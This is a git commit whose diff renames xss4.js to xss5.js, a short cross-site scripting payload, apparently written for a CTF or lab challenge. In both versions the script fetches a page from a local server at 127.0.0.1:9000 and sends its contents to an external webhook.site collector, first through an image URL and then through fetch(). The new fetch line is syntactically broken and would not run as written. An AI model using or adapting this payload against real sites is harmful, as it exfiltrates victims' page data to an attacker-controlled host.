6d59327586bb782908f9083a03e2c022c5f95a21
/hello <czavaleta93@gmail.com>
2021-11-03 16:48:16 -0500

    Update and rename xss4.js to xss5.js

--- xss4.js
+++
@@ -1,8 +0,0 @@
-
-fetch("http://127.0.0.1:9000/view/1ae3783c-3ca2-4c4f-8d23-70507dfcca93").then((res) => {
-	return res.text();
-}).then(data => {
-	var img = document.createElement("img");
-	img.src="https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data;
-	document.body.appendChild(img);
-})
---
+++ xss5.js
@@ -0,0 +1,6 @@
+
+fetch("http://127.0.0.1:9000/view/1ae3783c-3ca2-4c4f-8d23-70507dfcca93").then((res) => {
+	return res.text();
+}).then(data => {
+	fetch(https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data;);
+})
